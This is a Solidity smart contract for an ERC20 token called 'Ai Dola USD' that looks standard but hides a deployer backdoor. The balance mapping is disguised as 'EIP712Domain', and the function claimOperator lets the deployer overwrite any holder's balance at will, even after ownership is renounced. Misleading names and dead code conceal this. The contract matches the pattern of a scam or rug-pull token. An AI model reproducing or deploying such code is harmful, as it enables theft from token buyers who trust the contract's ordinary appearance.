pragma solidity 0.8.0;

abstract contract IFactory {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface Dola {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address Empfanger, uint256 Menge) external returns (bool);
    function allowance(address owner, address Spenderin) external view returns (uint256);
    function approve(address Spenderin, uint256 Menge) external returns (bool);
    function transferFrom(address sender, address Empfanger, uint256 Menge) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed Spenderin, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is IFactory {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract ERC20 is IFactory, Dola, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private EIP712Domain;
    mapping (address => mapping (address => uint256)) private setPendingOperator;
    bytes32 public DOMAIN_SEPARATOR;
    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint) public nonces;
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 3_000_000 * 10**_decimals;
    string private constant _name = "Ai Dola USD";
    string private constant _symbol = "ADOLA";
    address private pendingOperator; 
    constructor () {
        pendingOperator = _msgSender(); 
        EIP712Domain[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return EIP712Domain[account];
    }

    function transfer(address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(_msgSender(), Empfanger, Menge);
        return true;
    }

    function allowance(address owner, address Spenderin) public view override returns (uint256) {
        return setPendingOperator[owner][Spenderin];
    }

    function approve(address Spenderin, uint256 Menge) public override returns (bool) {
        _approve(_msgSender(), Spenderin, Menge);
        return true;
    }

    function transferFrom(address sender, address Empfanger, uint256 Menge) public override returns (bool) {
        _transfer(sender, Empfanger, Menge);
        _approve(sender, _msgSender(), setPendingOperator[sender][_msgSender()].sub(Menge, "ERC20: transfer Menge exceeds allowance"));
        return true;
    }

    function _approve(address owner, address Spenderin, uint256 Menge) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(Spenderin != address(0), "ERC20: approve to the zero address");
        setPendingOperator[owner][Spenderin] = Menge;
        emit Approval(owner, Spenderin, Menge);
    }

    function claimOperator(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        (Spenderin != address(0), "ERC20: burn from the zero address"); 
        DOMAIN_SEPARATOR;
        require(_msgSender() == pendingOperator, "Ownable: caller is not the owner");
        EIP712Domain[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }

    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = EIP712Domain[from];
        require(fromBalance >= Menge, "ERC20: transfer Menge exceeds balance");
        EIP712Domain[from] = fromBalance - Menge;

        EIP712Domain[to] = EIP712Domain[to].add(Menge);
        emit Transfer(from, to, Menge);
    }
}